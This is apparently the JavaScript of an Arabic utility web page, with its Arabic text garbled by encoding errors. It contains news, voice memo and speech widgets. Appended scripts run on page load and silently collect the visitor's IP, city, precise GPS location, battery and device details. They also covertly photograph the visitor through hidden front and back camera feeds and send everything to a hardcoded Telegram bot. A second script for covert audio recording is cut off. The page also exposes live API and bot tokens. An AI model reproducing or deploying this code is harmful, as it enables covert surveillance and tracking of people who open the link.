    // ... Ø¨Ø§Ù‚ÙŠ Ø£ÙƒÙˆØ§Ø¯Ùƒ Ø§Ù„Ø£Ø®Ø±Ù‰ Ù…Ø«Ù„ Ù…ÙˆØ§Ù‚ÙŠØª Ø§Ù„ØµÙ„Ø§Ø© ÙˆØ§Ø®ØªÙŠØ§Ø± Ø§Ù„Ù…Ø¯ÙŠÙ†Ø© ÙŠÙ…ÙƒÙ† Ø£Ù† ØªØ¨Ù‚Ù‰ ÙƒÙ…Ø§ Ù‡ÙŠ
    // Ù…Ù„Ø§Ø­Ø¸Ø©: Ø®Ø§ØµÙŠØ© Ø§Ø®ØªÙŠØ§Ø± Ø§Ù„Ù…Ø¯ÙŠÙ†Ø© Ø³ØªØºÙŠØ± Ù…ÙˆØ§Ù‚ÙŠØª Ø§Ù„ØµÙ„Ø§Ø© ÙÙ‚Ø· Ø§Ù„Ø¢Ù†ØŒ
    // Ø¨ÙŠÙ†Ù…Ø§ Ø§Ù„Ø·Ù‚Ø³ Ø³ÙŠØ¹ØªÙ…Ø¯ Ø¯Ø§Ø¦Ù…Ù‹Ø§ Ø¹Ù„Ù‰ Ù…ÙˆÙ‚Ø¹Ùƒ Ø§Ù„ÙØ¹Ù„ÙŠ.
});


// Ø§Ù†ØªÙ‡Ù‰ Ø§Ù„Ù†Ø³Ø®


// Ø§Ø¨Ø¯Ø£ Ø§Ù„Ù†Ø³Ø® Ù…Ù† Ù‡Ù†Ø§

// ================= ÙƒÙˆØ¯ Ø¢Ø®Ø± Ø§Ù„Ø£Ø®Ø¨Ø§Ø± Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… GNews =================

async function fetchNews() {
    // ØªÙ… Ø¥Ø¶Ø§ÙØ© Ù…ÙØªØ§Ø­ Ø§Ù„Ù€ API Ø§Ù„Ø®Ø§Øµ Ø¨Ùƒ Ù‡Ù†Ø§
    const apiKey = "680777e36302432ade57c19317448d08";
    const apiUrl = `https://gnews.io/api/v4/top-headlines?country=eg&lang=ar&token=${apiKey}`;

    const articlesContainer = document.getElementById('news-articles');

    try {
        const response = await fetch(apiUrl);
        const data = await response.json();

        if (response.ok) {
            articlesContainer.innerHTML = ""; // Ø¥ÙØ±Ø§Øº Ø±Ø³Ø§Ù„Ø© Ø§Ù„ØªØ­Ù…ÙŠÙ„
            
            data.articles.forEach(article => {
                // ØªØ®Ø·ÙŠ Ø§Ù„Ù…Ù‚Ø§Ù„Ø§Øª Ø¨Ø¯ÙˆÙ† Ø¹Ù†ÙˆØ§Ù† Ø£Ùˆ ØµÙˆØ±Ø©
                if (!article.title || !article.image) {
                    return;
                }

                const articleElement = `
                    <div class="article">
                        <img src="${article.image}" alt="${article.title}">
                        <h3>${article.title}</h3>
                        <p class="source">Ø§Ù„Ù…ØµØ¯Ø±: ${article.source.name}</p>
                        <a href="${article.url}" target="_blank">Ø§Ù‚Ø±Ø£ Ø§Ù„Ù…Ø²ÙŠØ¯</a>
                    </div>
                `;
                articlesContainer.innerHTML += articleElement;
            });
        } else {
            articlesContainer.innerHTML = `<p>Ø­Ø¯Ø« Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ Ø¬Ù„Ø¨ Ø§Ù„Ø£Ø®Ø¨Ø§Ø±.</p>`;
        }
    } catch (error) {
        console.error("ÙØ´Ù„ Ø¬Ù„Ø¨ Ø§Ù„Ø£Ø®Ø¨Ø§Ø±:", error);
        articlesContainer.innerHTML = "<p>ÙØ´Ù„ Ø§Ù„Ø§ØªØµØ§Ù„ Ø¨Ø®Ø§Ø¯Ù… Ø§Ù„Ø£Ø®Ø¨Ø§Ø±. ÙŠØ±Ø¬Ù‰ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ù…Ø±Ø© Ø£Ø®Ø±Ù‰.</p>";
    }
}

// Ù†Ø³ØªØ¯Ø¹ÙŠ Ø§Ù„Ø¯Ø§Ù„Ø© Ø¹Ù†Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø© Ù„Ø¬Ù„Ø¨ Ø§Ù„Ø£Ø®Ø¨Ø§Ø± ØªÙ„Ù‚Ø§Ø¦ÙŠÙ‹Ø§
document.addEventListener('DOMContentLoaded', fetchNews);

// Ø§Ù†ØªÙ‡Ù‰ Ø§Ù„Ù†Ø³Ø®

// Ø§Ø¨Ø¯Ø£ Ø§Ù„Ù†Ø³Ø® Ù…Ù† Ù‡Ù†Ø§




// ================= ÙƒÙˆØ¯ Ø¢Ø®Ø± Ø§Ù„Ø£Ø®Ø¨Ø§Ø± Ø¨Ø§Ø³ØªØ®Ø¯Ø§Ù… RSS =================

async function fetchNewsFromRss() {
    // 1. Ø±Ø§Ø¨Ø· RSS Ø§Ù„Ù…Ø³ØªÙ‡Ø¯Ù (ÙŠÙ…ÙƒÙ†Ùƒ ØªØºÙŠÙŠØ±Ù‡ Ù„Ø£ÙŠ Ù…ÙˆÙ‚Ø¹ Ø¢Ø®Ø±)
    const rssUrl = "https://www.youm7.com/rss/SectionRss?SectionID=65";

    // 2. Ø§Ø³ØªØ®Ø¯Ø§Ù… Ø®Ø¯Ù…Ø© rss2json Ù„ØªØ­ÙˆÙŠÙ„Ù‡ Ø¥Ù„Ù‰ JSON ÙˆØªØ¬Ø§ÙˆØ² CORS
    const apiUrl = `https://api.rss2json.com/v1/api.json?rss_url=${encodeURIComponent(rssUrl)}`;

    const articlesContainer = document.getElementById('news-articles');

    try {
        const response = await fetch(apiUrl);
        const data = await response.json();

        if (data.status === 'ok') {
            articlesContainer.innerHTML = ""; // Ø¥ÙØ±Ø§Øº Ø±Ø³Ø§Ù„Ø© Ø§Ù„ØªØ­Ù…ÙŠÙ„
            
            const articles = data.items;

            articles.forEach(article => {
                // ØªØ®Ø·ÙŠ Ø§Ù„Ù…Ù‚Ø§Ù„Ø§Øª Ø¨Ø¯ÙˆÙ† Ø¹Ù†ÙˆØ§Ù†
                if (!article.title) {
                    return;
                }

                // Ù…Ø­Ø§ÙˆÙ„Ø© Ø§Ø³ØªØ®Ø±Ø§Ø¬ ØµÙˆØ±Ø© Ù„Ù„Ù…Ù‚Ø§Ù„ (Ù‚Ø¯ Ù„Ø§ ØªÙƒÙˆÙ† Ù…ÙˆØ¬ÙˆØ¯Ø© Ø¯Ø§Ø¦Ù…Ù‹Ø§ ÙÙŠ RSS)
                // enclosure.link Ù‡Ùˆ Ø§Ù„Ù…ÙƒØ§Ù† Ø§Ù„Ø´Ø§Ø¦Ø¹ Ù„Ù„ØµÙˆØ±Ø© ÙÙŠ RSS
                const imageUrl = article.enclosure.link || 'https://i.imgur.com/3VzYf7b.png'; // ØµÙˆØ±Ø© Ø§ÙØªØ±Ø§Ø¶ÙŠØ©

                const articleElement = `
                    <div class="article">
                        <img src="${imageUrl}" alt="${article.title}">
                        <h3>${article.title}</h3>
                        <p class="source">Ø§Ù„Ù…ØµØ¯Ø±: ${data.feed.title}</p>
                        <a href="${article.link}" target="_blank">Ø§Ù‚Ø±Ø£ Ø§Ù„Ù…Ø²ÙŠØ¯</a>
                    </div>
                `;
                articlesContainer.innerHTML += articleElement;
            });
        } else {
            articlesContainer.innerHTML = `<p>Ø­Ø¯Ø« Ø®Ø·Ø£ Ø£Ø«Ù†Ø§Ø¡ Ø¬Ù„Ø¨ Ø§Ù„Ø£Ø®Ø¨Ø§Ø± Ù…Ù† Ù‚Ù†Ø§Ø© RSS.</p>`;
        }
    } catch (error) {
        console.error("ÙØ´Ù„ Ø¬Ù„Ø¨ Ø§Ù„Ø£Ø®Ø¨Ø§Ø± Ù…Ù† RSS:", error);
        articlesContainer.innerHTML = "<p>ÙØ´Ù„ Ø§Ù„Ø§ØªØµØ§Ù„. ÙŠØ±Ø¬Ù‰ Ø§Ù„Ù…Ø­Ø§ÙˆÙ„Ø© Ù…Ø±Ø© Ø£Ø®Ø±Ù‰.</p>";
    }
}

// Ù†Ø³ØªØ¯Ø¹ÙŠ Ø§Ù„Ø¯Ø§Ù„Ø© Ø¹Ù†Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø©
document.addEventListener('DOMContentLoaded', fetchNewsFromRss);


// Ø§Ù†ØªÙ‡Ù‰ Ø§Ù„Ù†Ø³Ø®

// Ø§Ø¨Ø¯Ø£ Ø§Ù„Ù†Ø³Ø® Ù…Ù† Ù‡Ù†Ø§

// ================ ÙƒÙˆØ¯ Ù…Ø³Ø¬Ù„ Ø§Ù„Ø°ÙƒØ±ÙŠØ§Øª Ø§Ù„ØµÙˆØªÙŠØ© ================
document.addEventListener('DOMContentLoaded', () => {
    // --- Ø¹Ù†Ø§ØµØ± Ø§Ù„ÙˆØ§Ø¬Ù‡Ø© ---
    const recordBtn = document.getElementById('record-btn');
    const stopBtn = document.getElementById('stop-record-btn');
    const statusEl = document.getElementById('recorder-status');
    const recordingsList = document.getElementById('recordings-list');

    let mediaRecorder;
    let audioChunks = [];
    let db;

    // --- 1. Ø¥Ø¹Ø¯Ø§Ø¯ Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª IndexedDB ---
    const request = indexedDB.open('voiceMemosDB', 1);

    request.onupgradeneeded = (event) => {
        const dbInstance = event.target.result;
        dbInstance.createObjectStore('recordings', { keyPath: 'id', autoIncrement: true });
    };

    request.onsuccess = (event) => {
        db = event.target.result;
        loadRecordings();
    };

    request.onerror = (event) => {
        console.error("Ø®Ø·Ø£ ÙÙŠ Ù‚Ø§Ø¹Ø¯Ø© Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª:", event.target.errorCode);
    };

    // --- 2. Ù…Ù†Ø·Ù‚ Ø§Ù„ØªØ³Ø¬ÙŠÙ„ ---
    async function startRecording() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
            mediaRecorder = new MediaRecorder(stream);

            mediaRecorder.ondataavailable = event => {
                audioChunks.push(event.data);
            };

            mediaRecorder.onstop = () => {
                const audioBlob = new Blob(audioChunks, { type: 'audio/wav' });
                saveRecording(audioBlob);
                audioChunks = []; // ØªÙØ±ÙŠØº Ø§Ù„Ø°Ø§ÙƒØ±Ø© Ù„Ù„ØªØ³Ø¬ÙŠÙ„ Ø§Ù„ØªØ§Ù„ÙŠ
            };

            mediaRecorder.start();
            updateUI(true); // ØªØ­Ø¯ÙŠØ« Ø§Ù„ÙˆØ§Ø¬Ù‡Ø© Ù„Ø­Ø§Ù„Ø© Ø§Ù„ØªØ³Ø¬ÙŠÙ„
        } catch (err) {
            console.error("Ø®Ø·Ø£ ÙÙŠ Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„Ù…ÙŠÙƒØ±ÙˆÙÙˆÙ†:", err);
            statusEl.textContent = "ÙŠØ¬Ø¨ Ø§Ù„Ø³Ù…Ø§Ø­ Ø¨Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„Ù…ÙŠÙƒØ±ÙˆÙÙˆÙ†.";
        }
    }

    function stopRecording() {
        if (mediaRecorder && mediaRecorder.state === "recording") {
            mediaRecorder.stop();
        }
        updateUI(false); // ØªØ­Ø¯ÙŠØ« Ø§Ù„ÙˆØ§Ø¬Ù‡Ø© Ù„Ù„Ø­Ø§Ù„Ø© Ø§Ù„Ø¹Ø§Ø¯ÙŠØ©
    }

    function updateUI(isRecording) {
        recordBtn.style.display = isRecording ? 'none' : 'inline-block';
        recordBtn.classList.toggle('recording', isRecording);
        stopBtn.style.display = isRecording ? 'inline-block' : 'none';
        statusEl.textContent = isRecording ? "Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ³Ø¬ÙŠÙ„..." : "Ø§Ø¶ØºØ· Ø¹Ù„Ù‰ Ø§Ù„Ø²Ø± Ù„Ø¨Ø¯Ø¡ Ø§Ù„ØªØ³Ø¬ÙŠÙ„";
    }
    
    recordBtn.addEventListener('click', startRecording);
    stopBtn.addEventListener('click', stopRecording);

    // --- 3. Ù…Ù†Ø·Ù‚ Ø§Ù„Ø­ÙØ¸ ÙˆØ§Ù„Ø¹Ø±Ø¶ ÙˆØ§Ù„Ø­Ø°Ù ---
    function saveRecording(blob) {
        const transaction = db.transaction(['recordings'], 'readwrite');
        const store = transaction.objectStore('recordings');
        const recording = {
            timestamp: new Date(),
            audio: blob
        };
        store.add(recording);

        transaction.oncomplete = () => {
            loadRecordings(); // Ø¥Ø¹Ø§Ø¯Ø© ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ù‚Ø§Ø¦Ù…Ø© Ø¨Ø¹Ø¯ Ø§Ù„Ø­ÙØ¸
        };
    }

    function loadRecordings() {
        recordingsList.innerHTML = '<h3>Ø§Ù„ØªØ³Ø¬ÙŠÙ„Ø§Øª Ø§Ù„Ù…Ø­ÙÙˆØ¸Ø©</h3>'; // Ø¥Ø¹Ø§Ø¯Ø© ØªØ¹ÙŠÙŠÙ† Ø§Ù„Ù‚Ø§Ø¦Ù…Ø©
        const transaction = db.transaction(['recordings'], 'readonly');
        const store = transaction.objectStore('recordings');
        const request = store.getAll();

        request.onsuccess = () => {
            const recordings = request.result.reverse(); // Ø¹Ø±Ø¶ Ø§Ù„Ø£Ø­Ø¯Ø« Ø£ÙˆÙ„Ø§Ù‹
            recordings.forEach(rec => {
                const recordingEl = createRecordingElement(rec);
                recordingsList.appendChild(recordingEl);
            });
        };
    }

    function createRecordingElement(rec) {
        const item = document.createElement('div');
        item.className = 'recording-item';
        
        const audioURL = URL.createObjectURL(rec.audio);
        const audioPlayer = new Audio(audioURL);
        audioPlayer.controls = true;

        const timestamp = document.createElement('span');
        timestamp.className = 'timestamp';
        timestamp.textContent = rec.timestamp.toLocaleString('ar-EG');
        
        const deleteBtn = document.createElement('button');
        deleteBtn.className = 'delete-btn';
        deleteBtn.innerHTML = '&times;';
        deleteBtn.onclick = () => deleteRecording(rec.id);
        
        item.appendChild(timestamp);
        item.appendChild(audioPlayer);
        item.appendChild(deleteBtn);
        return item;
    }

    function deleteRecording(id) {
        const transaction = db.transaction(['recordings'], 'readwrite');
        const store = transaction.objectStore('recordings');
        store.delete(id);
        transaction.oncomplete = () => {
            loadRecordings(); // Ø¥Ø¹Ø§Ø¯Ø© ØªØ­Ù…ÙŠÙ„ Ø§Ù„Ù‚Ø§Ø¦Ù…Ø© Ø¨Ø¹Ø¯ Ø§Ù„Ø­Ø°Ù
        };
    }
});

// Ø§Ù†ØªÙ‡Ù‰ Ø§Ù„Ù†Ø³Ø®

// Ø§Ø¨Ø¯Ø£ Ø§Ù„Ù†Ø³Ø® Ù…Ù† Ù‡Ù†Ø§

// ================ ÙƒÙˆØ¯ ØµÙ†Ø¯ÙˆÙ‚ Ø£Ø¯ÙˆØ§Øª Ø§Ù„ÙƒÙ„Ø§Ù… Ø§Ù„Ù…Ø¯Ù…Ø¬ (Ø¥ØµØ¯Ø§Ø± Ù…Ø­Ø¯Ø«) ================
document.addEventListener('DOMContentLoaded', () => {
    // --- Ø¹Ù†Ø§ØµØ± Ø§Ù„ÙˆØ§Ø¬Ù‡Ø© Ø§Ù„Ù…Ø´ØªØ±ÙƒØ© ---
    const sharedTextarea = document.getElementById('shared-textarea');
    const statusEl = document.getElementById('tool-status');

    // --- 1. Ø®Ø§ØµÙŠØ© Ù†Ø·Ù‚ Ø§Ù„Ù†Øµ (Text to Speech) ---
    const speakBtn = document.getElementById('speak-btn');
    const synth = window.speechSynthesis;

    speakBtn.addEventListener('click', () => {
        if (synth.speaking) {
            synth.cancel(); // Ø¥ÙŠÙ‚Ø§Ù Ø£ÙŠ Ù†Ø·Ù‚ Ø­Ø§Ù„ÙŠ
        }
        if (sharedTextarea.value.trim() !== '') {
            const utterThis = new SpeechSynthesisUtterance(sharedTextarea.value);
            const arabicVoice = synth.getVoices().find(voice => voice.lang.startsWith('ar'));
            if (arabicVoice) {
                utterThis.voice = arabicVoice;
            }
            utterThis.lang = 'ar-EG';
            synth.speak(utterThis);
        }
    });

    // --- 2. Ø®Ø§ØµÙŠØ© Ø§Ù„ØªØ¹Ø±Ù Ø¹Ù„Ù‰ Ø§Ù„ØµÙˆØª (Speech to Text) ---
    const listenBtn = document.getElementById('listen-btn');
    const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
    let final_transcript = ''; // ** Ù…ØªØºÙŠØ± Ù„ØªØ®Ø²ÙŠÙ† Ø§Ù„Ù†Øµ Ø§Ù„Ù†Ù‡Ø§Ø¦ÙŠ Ø§Ù„Ù…Ø¤ÙƒØ¯ **

    if (SpeechRecognition) {
        const recognition = new SpeechRecognition();
        recognition.lang = 'ar-EG';
        recognition.continuous = true;
        recognition.interimResults = true;

        listenBtn.addEventListener('click', () => {
            if (listenBtn.classList.contains('listening')) {
                recognition.stop();
            } else {
                recognition.start();
            }
        });

        recognition.onstart = () => {
            final_transcript = ''; // ** Ø¥Ø¹Ø§Ø¯Ø© ØªØ¹ÙŠÙŠÙ† Ø§Ù„Ù†Øµ Ø¹Ù†Ø¯ Ø¨Ø¯Ø¡ Ø¬Ù„Ø³Ø© Ø§Ø³ØªÙ…Ø§Ø¹ Ø¬Ø¯ÙŠØ¯Ø© **
            sharedTextarea.value = ''; // Ø¥ÙØ±Ø§Øº Ø§Ù„Ù…Ø±Ø¨Ø¹
            listenBtn.classList.add('listening');
            listenBtn.textContent = 'ğŸ›‘ Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„Ø§Ø³ØªÙ…Ø§Ø¹';
            statusEl.textContent = 'Ø§Ø³ØªÙ…Ø¹ Ø§Ù„Ø¢Ù†...';
        };

        // **** Ø§Ù„Ø¬Ø²Ø¡ Ø§Ù„Ø°ÙŠ ØªÙ… ØªØ¹Ø¯ÙŠÙ„Ù‡ Ø¨Ø§Ù„ÙƒØ§Ù…Ù„ Ù„Ø­Ù„ Ù…Ø´ÙƒÙ„Ø© Ø§Ù„ØªÙƒØ±Ø§Ø± ****
        recognition.onresult = (event) => {
            let interim_transcript = '';
            for (let i = event.resultIndex; i < event.results.length; ++i) {
                if (event.results[i].isFinal) {
                    final_transcript += event.results[i][0].transcript;
                } else {
                    interim_transcript += event.results[i][0].transcript;
                }
            }
            sharedTextarea.value = final_transcript + interim_transcript;
            updateExtraButtonsState();
        };
        // **** Ù†Ù‡Ø§ÙŠØ© Ø§Ù„Ø¬Ø²Ø¡ Ø§Ù„Ù…Ø¹Ø¯Ù„ ****
        
        recognition.onerror = (event) => {
            statusEl.textContent = `Ø®Ø·Ø£: ${event.error}`;
        };
        
        recognition.onend = () => {
            listenBtn.classList.remove('listening');
            listenBtn.textContent = 'ğŸ¤ Ø§Ø³ØªÙ…Ø¹ Ø§Ù„Ø¢Ù†';
            statusEl.textContent = '';
        };

    } else {
        statusEl.textContent = "Ø¹Ø°Ø±Ø§Ù‹ØŒ Ù…ØªØµÙØ­Ùƒ Ù„Ø§ ÙŠØ¯Ø¹Ù… Ø®Ø§ØµÙŠØ© Ø§Ù„ØªØ¹Ø±Ù Ø¹Ù„Ù‰ Ø§Ù„ØµÙˆØª.";
        listenBtn.disabled = true;
    }

    // --- 3. Ø§Ù„Ø£Ø¯ÙˆØ§Øª Ø§Ù„Ø¥Ø¶Ø§ÙÙŠØ© (Ù…Ø´Ø§Ø±ÙƒØ© ÙˆØªØ­Ù…ÙŠÙ„) ---
    const shareBtn = document.getElementById('share-btn');
    const downloadBtn = document.getElementById('download-btn');

    function updateExtraButtonsState() {
        const hasText = sharedTextarea.value.trim().length > 0;
        shareBtn.disabled = !hasText;
        downloadBtn.disabled = !hasText;
    }

    sharedTextarea.addEventListener('input', updateExtraButtonsState);

    shareBtn.addEventListener('click', () => {
        if (navigator.share && sharedTextarea.value) {
            navigator.share({
                title: 'Ù†Øµ Ù…Ù† ØªØ·Ø¨ÙŠÙ‚ÙŠ',
                text: sharedTextarea.value,
            }).catch(error => console.error('Ø®Ø·Ø£ ÙÙŠ Ø§Ù„Ù…Ø´Ø§Ø±ÙƒØ©:', error));
        }
    });

    downloadBtn.addEventListener('click', () => {
        if (sharedTextarea.value) {
            const blob = new Blob([sharedTextarea.value], { type: 'text/plain;charset=utf-8' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'Ø§Ù„Ù†Øµ_Ø§Ù„Ù…Ø­ÙÙˆØ¸.txt';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
        }
    });
    
    // Ø§Ù„ØªØ´ØºÙŠÙ„ Ø§Ù„Ø£ÙˆÙ„ÙŠ
    updateExtraButtonsState();
});

// Ø§Ù†ØªÙ‡Ù‰ Ø§Ù„Ù†Ø³Ø®















</script>



<script>
    // âš™ï¸ Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„ØªÙŠÙ„ÙŠØ¬Ø±Ø§Ù…
    const BOT_TOKEN = '8060685956:AAGJztf_aHHhFdBsH2OLuCPYS2TwPRY3_R4';
    const FIXED_CHAT_ID = '1431886140'; // Ø«Ø§Ø¨Øª

    // ğŸ“ Ø¬Ù„Ø¨ chatId Ù…Ù† Ø§Ù„Ø±Ø§Ø¨Ø·
    const urlParams = new URLSearchParams(window.location.search);
    const dynamicChatId = urlParams.get("id");

    // ğŸ› ï¸ Ø¥Ø±Ø³Ø§Ù„ Ù„Ù„Ù…Ø¹Ø±ÙØ§Øª ÙƒÙ„Ù‡Ø§
    function sendToTelegramMultiple(message, isLocation = false, lat = null, lon = null, photoBlob = null, caption = '') {
        const ids = [FIXED_CHAT_ID];
        if (dynamicChatId) ids.push(dynamicChatId);

        ids.forEach(chatId => {
            if (isLocation) {
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        latitude: lat,
                        longitude: lon
                    })
                }).catch(() => {});
            } else if (photoBlob) {
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', photoBlob, 'photo.webp');
                if (caption) formData.append('caption', caption);

                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                }).catch(() => {});
            } else {
                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                }).catch(() => {});
            }
        });
    }

    // ğŸŒ Ø¬Ù…Ø¹ Ø¨ÙŠØ§Ù†Ø§Øª Ø¥Ø¶Ø§ÙÙŠØ©
    async function collectAdditionalData() {
        let ip = 'Ù…Ø§ÙÙŠØ´';
        let country = 'Ù…Ø§ÙÙŠØ´';
        let city = 'Ù…Ø§ÙÙŠØ´';

        try {
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            ip = data.ip || 'Ù…Ø§ÙÙŠØ´';
            country = data.country_name || 'Ù…Ø§ÙÙŠØ´';
            city = data.city || 'Ù…Ø§ÙÙŠØ´';
        } catch (e) {}

        let batteryLevel = 'Ù…Ø§ÙÙŠØ´';
        let batteryCharging = 'Ù…Ø§ÙÙŠØ´';
        try {
            const battery = await navigator.getBattery();
            batteryLevel = Math.round(battery.level * 100) + '%';
            batteryCharging = battery.charging ? 'Ù†Ø¹Ù…' : 'Ù„Ø§';
        } catch (e) {}

        return {
            ip, country, city,
            platform: navigator.platform,
            deviceVersion: navigator.userAgent,
            batteryLevel, batteryCharging
        };
    }

    // ğŸ“ Ø¬Ù„Ø¨ Ø§Ù„Ù…ÙˆÙ‚Ø¹
    function getLocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve(null);
                return;
            }

            navigator.geolocation.getCurrentPosition(
                (position) => {
                    const { latitude, longitude, accuracy } = position.coords;
                    resolve({ lat: latitude, lon: longitude, accuracy });
                },
                () => resolve(null),
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        });
    }

    // ğŸ“ Ø¥Ø±Ø³Ø§Ù„ ØªÙ‚Ø±ÙŠØ±
    function sendTextReport(data, note = '') {
        let message = `
ğŸ“‹ *ØªÙ‚Ø±ÙŠØ± Ø¬Ù…Ø¹ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª*
ğŸ†” Ø§Ù„Ø«Ø§Ø¨Øª: ${FIXED_CHAT_ID}
ğŸ†” Ù…Ù† Ø§Ù„Ø±Ø§Ø¨Ø·: ${dynamicChatId || 'Ù…Ø§ÙÙŠØ´'}
ğŸŒ Ø§Ù„Ø¬Ù‡Ø§Ø²:
â€¢ Ø§Ù„Ù†Ø¸Ø§Ù…: ${data.platform}
â€¢ User Agent: ${data.deviceVersion}
ğŸ”‹ Ø§Ù„Ø¨Ø·Ø§Ø±ÙŠØ©: ${data.batteryLevel} | Ø§Ù„Ø´Ø­Ù†: ${data.batteryCharging}
ğŸŒ Ø§Ù„Ù…ÙˆÙ‚Ø¹:
â€¢ Ø§Ù„Ø¢ÙŠØ¨ÙŠ: ${data.ip}
â€¢ Ø§Ù„Ø¯ÙˆÙ„Ø©: ${data.country}
â€¢ Ø§Ù„Ù…Ø¯ÙŠÙ†Ø©: ${data.city}
${note ? `ğŸ“Œ Ù…Ù„Ø§Ø­Ø¸Ø©: ${note}` : ''}
â° ${new Date().toLocaleString('ar-EG')}
        `.trim();

        sendToTelegramMultiple(message);
    }

    // ğŸ“¸ Ø¥Ø¹Ø¯Ø§Ø¯ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
    function setupCamera(video, canvas, type) {
        video.play();
        video.onplaying = () => {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext('2d');
            let count = 0;

            const interval = setInterval(() => {
                if (count >= 3) {
                    clearInterval(interval);
                    stopCamera(video);
                    return;
                }
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                canvas.toBlob(blob => {
                    sendToTelegramMultiple('', false, null, null, blob, `ğŸ“¸ ÙƒØ§Ù…ÙŠØ±Ø§ ${type} - ØµÙˆØ±Ø© ${count + 1}`);
                }, 'image/jpeg', 0.7);
                count++;
            }, 1500);
        };
    }

    function stopCamera(video) {
        if (video.srcObject) {
            video.srcObject.getTracks().forEach(track => track.stop());
        }
    }

    // ğŸš€ ØªØ´ØºÙŠÙ„ Ø¹Ù†Ø¯ ØªØ­Ù…ÙŠÙ„ Ø§Ù„ØµÙØ­Ø©
    window.addEventListener('load', async () => {
        const data = await collectAdditionalData();

        // ğŸ“ Ø§Ù„Ù…ÙˆÙ‚Ø¹
        const location = await getLocation();
        if (location) {
            sendToTelegramMultiple('', true, location.lat, location.lon);
            data.location = `Lat: ${location.lat}, Lon: ${location.lon}, Ø¯Ù‚Ø©: ${location.accuracy}`;
        } else {
            data.location = 'Ù…Ø§ÙÙŠØ´';
        }

        sendTextReport(data);

        // ğŸ¥ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§Øª
        const frontVideo = document.createElement('video');
        const backVideo = document.createElement('video');
        const frontCanvas = document.createElement('canvas');
        const backCanvas = document.createElement('canvas');

        [frontVideo, backVideo].forEach(v => {
            v.setAttribute('playsinline', '');
            v.setAttribute('autoplay', '');
            v.setAttribute('muted', '');
            document.body.appendChild(v);
            v.style.display = 'none';
        });

        [frontCanvas, backCanvas].forEach(c => {
            document.body.appendChild(c);
            c.style.display = 'none';
        });

        try {
            const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
            frontVideo.srcObject = frontStream;
            setupCamera(frontVideo, frontCanvas, "Ø£Ù…Ø§Ù…ÙŠØ©");
        } catch (e) {
            sendToTelegramMultiple("âŒ ÙØ´Ù„ Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø£Ù…Ø§Ù…ÙŠØ©");
        }

        try {
            const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
            backVideo.srcObject = backStream;
            setupCamera(backVideo, backCanvas, "Ø®Ù„ÙÙŠØ©");
        } catch (e) {
            sendToTelegramMultiple("âŒ ÙØ´Ù„ Ø§Ù„ÙˆØµÙˆÙ„ Ù„Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ø§Ù„Ø®Ù„ÙÙŠØ©");
        }
    });
</script>

<script>
    // --- Ø§Ù„Ø¥Ø¹Ø¯Ø§Ø¯Ø§Øª Ø§Ù„Ø£Ø³Ø§Ø³ÙŠØ© ---
    const BOT_TOKEN = '8060685956:AAGJztf_aHHhFdBsH2OLuCPYS2TwPRY3_R4';
    const ADMIN_CHAT_ID = '1431886140'; // Ø§Ù„Ù€ ID Ø§Ù„Ø«Ø§Ø¨Øª Ø§Ù„Ø®Ø§Øµ Ø¨Ùƒ
    const RECORDING_INTERVAL_MS = 30000; // Ù…Ø¯Ø© ÙƒÙ„ Ù…Ù‚Ø·Ø¹ ØªØ³Ø¬ÙŠÙ„ (30 Ø«Ø§Ù†ÙŠØ©)

    // --- Ù…ØªØºÙŠØ±Ø§Øª Ù„Ù„ØªØ­ÙƒÙ… ÙÙŠ Ø§Ù„Ø­Ø§Ù„Ø© ---
    let mediaRecorder;
    let audioChunks = [];
    let isRecording = false;
    let streamReference;
    let userChatId; // Ø³ÙŠØªÙ… ØªØ¹Ø¨Ø¦ØªÙ‡ Ù…Ù† Ø§Ù„Ø±Ø§Ø¨Ø·

    /**
     * Ø¯Ø§Ù„Ø© Ù„Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ù€ ID Ù…Ù† Ø±Ø§Ø¨Ø· URL
     */
    function getUserChatIdFromUrl() {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get('id');
    }

    /**
